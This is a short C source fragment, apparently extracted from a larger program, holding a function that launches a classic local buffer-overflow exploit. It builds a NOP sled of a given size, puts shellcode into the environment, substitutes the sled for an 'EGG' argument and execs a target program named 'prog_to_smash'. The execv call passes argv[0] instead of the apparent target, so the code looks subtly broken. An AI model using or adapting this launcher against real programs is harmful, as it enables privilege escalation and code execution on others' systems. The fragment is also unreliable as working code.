
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int execv (char*,char**) ;
 int exit (int) ;
 int fprintf (int ,char*,char*) ;
 scalar_t__ malloc (int) ;
 int memset (char*,int,int) ;
 int perror (char*) ;
 int putenv (int ) ;
 int sc ;
 int stderr ;
 scalar_t__ strcmp (char*,char*) ;
 int strtol (char*,int *,int ) ;

int prepare2(int argc, char *argv[]) {
 int len, off;
 char *buff;

 if (argc < 4) {
  fprintf(stderr, "%s <size> <prog_to_smash> [args] EGG "
   "[args].\n", argv[0]);
  exit(1);
 }
 for (off = 1; off < argc && strcmp(argv[off], "EGG"); ++off);
 if (off >= argc) {
  fprintf(stderr, "%s: no EGG parameter specified. Aborting.\n",
    argv[0]);
  exit(1);
 }
 len = strtol(argv[1], ((void*)0), 0);
 buff = (char *) malloc(len + 1);
 buff[len] = '\0';
 memset(buff, 0x90, len);
 putenv(sc);
 argv[off] = buff;
 execv(argv[0], argv+2);
 perror(argv[0]);
 return 1;
}
